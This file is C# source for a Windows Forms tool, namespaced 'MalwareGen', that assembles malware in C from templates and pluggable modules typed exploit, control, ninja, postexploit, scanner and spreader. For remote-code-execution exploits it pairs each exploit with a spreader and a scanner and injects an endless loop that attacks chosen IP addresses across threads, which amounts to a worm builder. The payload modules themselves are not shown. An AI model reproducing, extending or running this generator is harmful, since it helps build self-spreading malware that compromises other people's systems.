using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Windows.Forms;
using System.Xml;
using System.Text.RegularExpressions;

namespace MalwareGen
{
    class Controller
    {
        private static String mainExploit =
            "	int  ipAddress[4];\r\n"
            + "[chooseIP](ipAddress);\r\n"
            + "	for (;;){\r\n"
            + "	initAttack(ipAddress);\r\n"
            + "    }\r\n"
            + "    WSACleanup();\r\n";
        private static List<Modules> lsModules = new List<Modules>();
        private static String[] types = { "exploit","control","ninja","postexploit","scanner","spreader"} ;
        public static String moduleDir = @"Modules";
        public static String templateDir = "";
        public static String outputDir = @"Output";
        public static String getAllModuleName()
        {
            String ret ="";
            foreach(Modules test in lsModules)
            {
                ret += test.MName + Environment.NewLine;
            }
            return ret;
        }
        public static void clearAllModules()
        {
            lsModules.Clear();
        }
        private static void removeModulebyName(String MName)
        {
            lsModules.Remove(lsModules.Find(p => p.MName == MName));
        }
        public static void BuildTree(DirectoryInfo directoryInfo, TreeNodeCollection addInMe)
        {
            TreeNode curNode = addInMe.Add(directoryInfo.Name);

            //foreach (FileInfo file in directoryInfo.GetFiles())
            //{
               
            //    curNode.Nodes.Add(file.FullName, file.Name);
            //}
            foreach (DirectoryInfo subdir in directoryInfo.GetDirectories())
            {
                BuildTree(subdir, curNode.Nodes);
            }
        }
        public static bool checkMType(Modules mod)
        {
            if (types.Contains(mod.MType.ToLower()))
                return true;
            return false;
        }
        public static void addModules(Modules mod)
        {
            //validate module
            if(mod.MName == "" && !(checkMType(mod)))
            {
                MessageBox.Show("This module is not valid! Please check again");
                return;
            }
            try
            {
                //Each module just add once
                bool check=true;
                foreach(Modules a in lsModules)
                {
                    if (mod.MName == a.MName)
                        check = false;
                }
                if (check)
                {
                    //if exploit, choose Spreader for it
                    if (mod.MType.ToLower() == "exploit")
                    {
                        Modules sp = new Modules();
                        //Spreader not null
                        do
                            sp = ChooseSpreader(mod.exploitType, "for Exploit " + mod.MName);
                        while (sp == null);
                        addModules(sp);
                        mod.Spreader = sp.MName;
                    }
                    lsModules.Add(mod);
                }
            }
            catch(Exception e)
            {
                MessageBox.Show(e.ToString());
            }
            
        }
        private static bool validateInput(ref String ret)
        {
            if ((!Regex.IsMatch(ret, @"^[a-zA-Z0-9]|^[_-]*$")) || ret == "" || ret == null)
            {
                return false;
            }
            else
            {
                ret = ret.Trim();
                return true;
            }
        }
        public static void generate(String malName,String template)
        {
            string threads = "1";
            templateDir = template;
            //copy template file to output folder
            String targetDir = Path.Combine(outputDir, malName);
            if (!Directory.Exists(targetDir)&&validateInput(ref targetDir))
            {
                Directory.CreateDirectory(targetDir);
            }
            else
            {
                MessageBox.Show("Malware name has exits or invalid, please choose another name!");
                return;
            }
            String headerFile = targetDir + "\\" + malName + ".h";
            String sourceFile = targetDir + "\\" + malName + ".c";
            File.Copy(templateDir + "\\template.h", headerFile, true);
            File.Copy(templateDir + "\\template.c", sourceFile, true);
            String _headStr = File.ReadAllText(headerFile);
            String _sourStr = File.ReadAllText(sourceFile);
            //Copy Module file to output folder
            foreach (Modules mod in lsModules)
            {
                foreach (String file in Directory.GetFiles(mod.Path))
                {
                    String c = file.Replace(mod.Path, "");
                    if (c != "info.xml")
                        File.Copy(file, targetDir + "\\" + c);
                }
            }
            //Create exploit file
            if (hasRCE())
            {
                //Choose threads (targets/round)
                threads = ChooseThreads();
                //+choose main scanner
                Modules sc = ChooseScanner(false);
                addModules(sc);
                //+replace main exploit
                String text = mainExploit;
                text = text.Replace("[chooseIP]", sc.MName);
                generateExploit(ref _sourStr, malName,sc.MName);
                _sourStr = _sourStr.Replace("[mainExploit]", Environment.NewLine + text);
            }
            //include independent modules (require ="")
            String modStr = "";
            foreach(Modules test in lsModules)
            {
                //generate modules code in source, header file
                if (test.isIndependentModule())
                {
                    modStr += generateModule(test.MName);
                }
                //Add input from user to module source, header file
                if(test.Inputs.Count != 0)
                {
                    try
                    {
                        string headfile = targetDir + "\\" + test.MName + ".h";
                        string sourfile = targetDir + "\\" + test.MName + ".c";
                        string headStr = File.ReadAllText(headfile);
                        string sourStr = File.ReadAllText(sourfile);
                        foreach (KeyValuePair<String, String> item in test.Inputs)
                        {
                            headStr = headStr.Replace("[" + item.Key + "]", item.Value);
                            sourStr = sourStr.Replace("[" + item.Key + "]", item.Value);
                        }
                        File.WriteAllText(headfile, headStr);
                        File.WriteAllText(sourfile, sourStr);
                    }
                    catch(Exception e)
                    {
                        MessageBox.Show(e.ToString());
                    }

                }
            }
            if (modStr != "")
            {
                _sourStr = _sourStr.Replace("[ModuleThreads]", modStr);
            }
            //include header file
            _sourStr = _sourStr.Replace("[malwareName]", malName);

            //Create header file
            generateHeader(ref _headStr, malName, threads);
            //Write to file
            try
            {
                //header
                File.WriteAllText(headerFile, _headStr);
                //source
                File.WriteAllText(sourceFile, _sourStr);
                MessageBox.Show("Generate successfully! Source code in: " + outputDir + "\\" + malName + "\\");
            }
            catch(Exception e)
            {
                MessageBox.Show("An error occur while writting file!" + Environment.NewLine + e.ToString());
            }
        }
        private static bool hasRCE()
        {
            bool check = false;
            foreach (Modules a in lsModules)
            {
                if (a.MType.ToLower() == "exploit")
                    if(a.exploitType.ToLower()=="rce")
                        check = true;
            }
            return check;
        }
        private static void generateHeader(ref String _headStr,String malName,String threads)
        {

            //include source file
            _headStr = _headStr.Replace("[sourcefile]", Environment.NewLine + "#include \"" + malName + ".c\"");
            //Define Malware name
            _headStr = _headStr.Replace("[malwareName]", Environment.NewLine + "#define MALNAME \"" +malName+"\"");
            String tmp = "";
            //include header String
            foreach (Modules test in lsModules)
            {
                //include header file
                foreach (String a in test.Files)
                    tmp += (a.Substring(a.Length-2,2) == ".h") ? "#include \""+a+"\"" + Environment.NewLine : "";
            }
            _headStr = _headStr.Replace("[headerfile]", Environment.NewLine + tmp);
            tmp = "";
            //include header String
            foreach (Modules test in lsModules)
            {
                if(test.Header!=null)
                    tmp += "//" + test.MName + Environment.NewLine + test.Header.Trim() + Environment.NewLine;
            }
            _headStr = _headStr.Replace("[headerString]", Environment.NewLine + tmp);
            tmp = "";
            _headStr = _headStr.Replace("[threads]", threads);
            
        }
        private static void generateExploit(ref String _sourStr,String malName,String scanner)
        {
            
            String mainFile = outputDir + "\\" + malName + "\\" + malName + ".c";
            //exFunc store exploit function for each exploit Module.
            //exThre store the code that run the exploit Module in mutithreads mode.
            String exFunc = "";
            String exThre = "";
            //String ret = "";
            //ret = File.ReadAllText(templateDir + "\\" + "template.c");
            bool check = false;
            foreach (Modules test in lsModules)
            {
                if(test.MType.ToLower() == "exploit")
                {
                    check = true;

                    //generate exploit function
                    try
                    {
                        exFunc += File.ReadAllText(templateDir + "\\" + "exploitFunction.c");
                        exThre += File.ReadAllText(templateDir + "\\" + "exploitThreads.c");
                    }
                    catch
                    {
                        MessageBox.Show("Can't find exploitFunction.c and exploitThreads.h in " + templateDir);
                    }
                    //generate exploit Function
                    exFunc = exFunc.Replace("[exploitName]", test.MName);
                    exFunc = exFunc.Replace("[Spreader]", test.Spreader);
                    exFunc += Environment.NewLine;
                    //generate exploit threads
                    exThre = exThre.Replace("[exploitName]", test.MName);
                    exThre = exThre.Replace("[Scanner]", scanner);
                    exThre += Environment.NewLine;
                }
            }
            if (check)
            {
                _sourStr = _sourStr.Replace("[exploitThreads]", Environment.NewLine + exThre);
                _sourStr = _sourStr.Replace("[exploit_function]", Environment.NewLine + exFunc);
            }
        }
        private static String generateModule(String MName)
        {
            String ret = Environment.NewLine;
            String tmp = File.ReadAllText(templateDir + "\\" + "moduleThreads.c");
            ret = tmp.Replace("[MName]", MName);
            return ret;
        }
        private static Modules ChooseSpreader(String exploitType,string info)
        {
            frmChooseSpreader testDialog = new frmChooseSpreader(exploitType, info);
            Modules ret = new Modules();

            if (testDialog.ShowDialog() == DialogResult.OK)
            {
                ret = testDialog.input;
                testDialog.Dispose();
            }
            testDialog.Dispose();
            return ret;
        }
        private static Modules ChooseScanner(bool depen)
        {
            frmChooseScanner testDialog = new frmChooseScanner(depen);
            Modules ret = new Modules();

            if (testDialog.ShowDialog() == DialogResult.OK)
            {
                ret = testDialog.input;
                testDialog.Dispose();
            }
            testDialog.Dispose();
            return ret;
        }
        private static String ChooseInput(String inputName,String value,String modName)
        {
            frmInput testDialog = new frmInput(inputName, value, modName);
            String ret = "";

            if (testDialog.ShowDialog() == DialogResult.OK)
            {
                ret = testDialog.input;
                testDialog.Dispose();
            }
            testDialog.Dispose();
            return ret;
        }
        public static void addInputValue(ref Modules mod, String key, String value)
        {
            String val = ChooseInput(key, value,mod.MName);
            mod.Inputs[key] = val;
        }
        private static String ChooseThreads()
        {
            frmThreads testDialog = new frmThreads();
            String ret = "";

            if (testDialog.ShowDialog() == DialogResult.OK)
            {
                ret = testDialog.input;
                testDialog.Dispose();
            }
            testDialog.Dispose();
            return ret;
        }
    }

    

}
